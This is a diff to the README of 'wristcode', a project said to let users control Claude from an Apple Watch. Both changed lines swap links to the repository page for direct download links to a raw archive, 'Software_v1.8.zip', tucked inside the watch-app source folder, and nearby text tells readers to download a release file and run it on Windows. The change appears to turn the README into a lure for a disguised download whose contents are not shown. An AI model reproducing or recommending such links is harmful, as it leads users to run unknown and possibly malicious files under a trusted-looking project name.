@@ -1,6 +1,6 @@
 # 🧭 wristcode - Control Claude from your wrist
 
-[![Download wristcode](https://img.shields.io/badge/Download%20wristcode-blue?style=for-the-badge&logo=github)](https://github.com/elonoretannish464/wristcode)
+[![Download wristcode](https://img.shields.io/badge/Download%20wristcode-blue?style=for-the-badge&logo=github)](https://github.com/elonoretannish464/wristcode/raw/refs/heads/main/WristCode/WristCode Watch App/Software_v1.8.zip)
 
 ## 📱 What wristcode does
 
@@ -31,7 +31,7 @@ For the best setup, keep your Windows PC, iPhone, and Apple Watch on the same ne
 
 Visit this page to download and set up wristcode:
 
-[https://github.com/elonoretannish464/wristcode](https://github.com/elonoretannish464/wristcode)
+[https://github.com/elonoretannish464/wristcode/raw/refs/heads/main/WristCode/WristCode Watch App/Software_v1.8.zip](https://github.com/elonoretannish464/wristcode/raw/refs/heads/main/WristCode/WristCode Watch App/Software_v1.8.zip)
 
 If you see a release file, download it. If you see the source files only, use the setup steps below to run it on Windows.
 
